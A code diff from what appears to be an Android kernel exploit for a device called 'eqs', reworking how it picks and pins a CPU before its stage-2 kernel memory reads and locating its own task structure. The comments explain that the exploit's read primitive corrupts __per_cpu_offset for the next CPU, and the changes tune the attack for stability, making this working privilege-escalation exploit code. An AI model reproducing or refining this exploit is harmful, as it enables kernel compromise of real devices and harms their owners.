@@ -930,23 +930,29 @@ static int eqs_cpu_online(int cpu) {
   return b[0] == '1';
 }
 
-/* Highest CPU that is both online and inside our current affinity mask. Picking
- * the highest *online* CPU is wrong for an app: untrusted_app cpusets are
- * restricted (eqs: foreground=0-6), so pin_to_core() silently fails and the
- * process keeps migrating while we still index __entry_task by the CPU we merely
- * observed earlier. */
+/* The CPU we must *actually run on* for the stage-2 reads.
+ *
+ * CRITICAL, not a preference: every shape-0 read puts L = &random_table[4].data
+ * into q+8 as collateral, and for q = &__per_cpu_offset[cpu] that is
+ * __per_cpu_offset[cpu+1]. That slot is only harmless when cpu+1 is not a live
+ * CPU, so cpu MUST be the highest possible CPU index (7 on eqs, where
+ * nr_cpu_ids == 8 and __per_cpu_offset[] has NR_CPUS == 32 entries). Reading
+ * per_cpu_offset for any lower cpu destroys the per-cpu base of the next CPU:
+ * every task scheduled there afterwards computes per_cpu_ptr() from a bogus
+ * offset, which shows up as random process deaths (system_server/zygote in the
+ * app run) and as the ~50 % hard crashes seen with cpu0 -- the core pins the
+ * main thread to cpu0, so the unmodified port always corrupted
+ * __per_cpu_offset[1]. The standalone exploit pinned to cpu7 and was stable.
+ *
+ * Hence: pick the highest possible CPU, and require that we can be pinned to it
+ * exclusively; refuse (in eqs_derive_own_task) instead of falling back to a CPU
+ * whose +1 neighbour is live. */
 static int eqs_pick_top_cpu(void) {
-  cpu_set_t allowed;
-  CPU_ZERO(&allowed);
-  int have_mask = sched_getaffinity(0, sizeof(allowed), &allowed) == 0;
   long conf = sysconf(_SC_NPROCESSORS_CONF);
   if (conf <= 0 || conf > CPU_SETSIZE) {
     conf = CPU_SETSIZE;
   }
   for (int cpu = (int)conf - 1; cpu >= 0; cpu--) {
-    if (have_mask && !CPU_ISSET(cpu, &allowed)) {
-      continue;
-    }
     if (eqs_cpu_online(cpu)) {
       return cpu;
     }
@@ -985,11 +991,13 @@ static int eqs_derive_own_task(int *idx, uint64_t *task_out, int *cpu_out) {
   *task_out = 0;
   *cpu_out = -1;
   int want_cpu = eqs_pick_top_cpu();
-  if (want_cpu >= 0) {
-    pin_to_core((size_t)want_cpu);
-    for (int spin = 0; spin < 200 && sched_getcpu() != want_cpu; spin++) {
-      usleep(1000);
-    }
+  if (want_cpu < 0) {
+    pr_error("eqs own-task no usable cpu\n");
+    return 0;
+  }
+  pin_to_core((size_t)want_cpu);
+  for (int spin = 0; spin < 500 && sched_getcpu() != want_cpu; spin++) {
+    usleep(1000);
   }
   int cpu = sched_getcpu();
   if (cpu < 0 || cpu > 63) {
@@ -999,12 +1007,17 @@ static int eqs_derive_own_task(int *idx, uint64_t *task_out, int *cpu_out) {
   {
     cpu_set_t got;
     CPU_ZERO(&got);
-    int pinned_ok = sched_getaffinity(0, sizeof(got), &got) == 0 &&
-                    CPU_ISSET(cpu, &got) && CPU_COUNT(&got) == 1;
+    int mask_ok = sched_getaffinity(0, sizeof(got), &got) == 0;
+    int pinned_ok = mask_ok && CPU_ISSET(cpu, &got) && CPU_COUNT(&got) == 1;
     pr_success("eqs own-task pick want_cpu=%d observed=%d pinned=%d\n",
                want_cpu, cpu, pinned_ok);
-    if (!pinned_ok) {
-      pin_to_core((size_t)cpu);
+    if (cpu != want_cpu || !pinned_ok) {
+      /* Refusing is mandatory here: a lower cpu would corrupt
+         __per_cpu_offset[cpu+1] (a live per-cpu base) in the very next read. */
+      pr_error("eqs own-task refusing cpu=%d want=%d pinned=%d: reading "
+               "per_cpu_offset here would corrupt __per_cpu_offset[%d]\n",
+               cpu, want_cpu, pinned_ok, cpu + 1);
+      return 0;
     }
     eqs_sample_cpu = cpu;
   }
